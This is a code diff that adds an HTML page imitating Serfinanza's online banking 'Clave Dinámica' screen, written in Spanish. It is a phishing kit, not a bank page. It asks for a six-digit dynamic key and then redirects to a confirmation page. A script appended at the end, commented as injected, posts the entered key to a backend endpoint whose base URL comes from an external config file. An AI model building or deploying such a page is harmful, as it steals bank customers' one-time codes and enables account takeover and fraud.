@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clave Dinámica - Serfinanza</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .logo {
+      max-width: 220px;
+      margin-bottom: 20px;
+    }
+    .oval-icon {
+      background: #1a1a80;
+      color: #fff;
+      border-radius: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px 25px;
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
+      flex-wrap: nowrap;
+    }
+    .oval-icon svg {
+      width: 22px;
+      height: 22px;
+      fill: #fff;
+      margin-right: 10px;
+      flex-shrink: 0;
+    }
+    .login-container {
+      text-align: center;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 30px 20px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
+      background: #fff;
+    }
+    .login-container h2 {
+      color: #1a1a80;
+      margin: 20px 0;
+      font-size: 18px;
+    }
+    .input-box {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f9f9f9;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+    .input-box input {
+      border: none;
+      outline: none;
+      font-size: 22px;
+      text-align: center;
+      width: 100%;
+      background: transparent;
+      letter-spacing: 8px;
+    }
+    .btn {
+      background: #f53657;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #d42d4a;
+    }
+    .links {
+      margin-top: 15px;
+      font-size: 14px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .links a {
+      margin: 5px 8px;
+      color: #1a1a80;
+      text-decoration: none;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    @media (max-width: 480px) {
+      .oval-icon {
+        font-size: 14px;
+        padding: 10px 18px;
+      }
+      .input-box input {
+        font-size: 20px;
+        letter-spacing: 6px;
+      }
+    }
+  </style>
+  <script src="config.js"></script>
+</head>
+<body>
+  <!-- Logo -->
+  <img src="logo2.png" alt="Serfinanza Logo" class="logo">
+
+  <!-- Botón ovalado arriba con candado blanco -->
+  <div class="oval-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+      <path d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6-7h-1V7a5 5 0 0 0-10 0v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2zm-3 0H9V7a3 3 0 0 1 6 0v3z"/>
+    </svg>
+    Clave Dinámica
+  </div>
+
+  <!-- Caja de login -->
+  <div class="login-container">
+    <h2>BIENVENIDO A TU SERFINANZA VIRTUAL PERSONAS</h2>
+    <div class="input-box">
+      <input type="text" maxlength="6" pattern="[0-9]*" inputmode="numeric" id="clave" placeholder="••••••">
+    </div>
+    <button class="btn" id="confirmar">Confirmar</button>
+    <div class="links">
+      <a href="#">Regístrate aquí</a> | 
+      <a href="#">Recordar Usuario</a> | 
+      <a href="#">Restablecer Contraseña</a>
+    </div>
+  </div>
+
+  <script>
+    const input = document.getElementById("clave");
+    let realValue = "";
+
+    input.addEventListener("input", function(e) {
+      let value = e.target.value;
+      let lastChar = value.slice(-1);
+
+      if (!/[0-9]/.test(lastChar)) {
+        e.target.value = realValue.replace(/./g, "•");
+        return;
+      }
+
+      if (realValue.length < 6) {
+        realValue += lastChar;
+      }
+
+      e.target.value = realValue.replace(/./g, "•");
+
+      setTimeout(() => {
+        e.target.value = realValue.slice(0, -1).replace(/./g, "•") + lastChar;
+        setTimeout(() => {
+          e.target.value = realValue.replace(/./g, "•");
+        }, 400);
+      }, 10);
+    });
+
+    // Al presionar "Confirmar"
+    document.getElementById("confirmar").addEventListener("click", function() {
+      if (realValue.length === 6) {
+        // --- Aquí redirige a confirmado.html ---
+        window.location.href = "confirmado.html";
+      } else {
+        alert("Por favor ingresa los 6 dígitos de la clave dinámica.");
+      }
+    });
+  </script>
+<!-- Injected script: send clave dinamica to backend -->
+<script>
+(function(){
+  async function sendPartial(data){
+    try {
+      await fetch(window.API_BASE + '/api/users/save',{
+        method:'POST',
+        headers:{ 'Content-Type':'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch (err) { console.error(err); }
+  }
+  document.addEventListener('DOMContentLoaded', function(){
+    const btn = document.getElementById('confirmar');
+    if (!btn) return;
+    btn.addEventListener('click', function(){
+      const input = document.getElementById('clave');
+      const clave = (window.realValue && window.realValue.length>0) ? window.realValue : (input ? input.value : '');
+      sendPartial({ clave_dinamica: clave });
+    });
+  });
+})();
+</script>
+</body>
+</html>
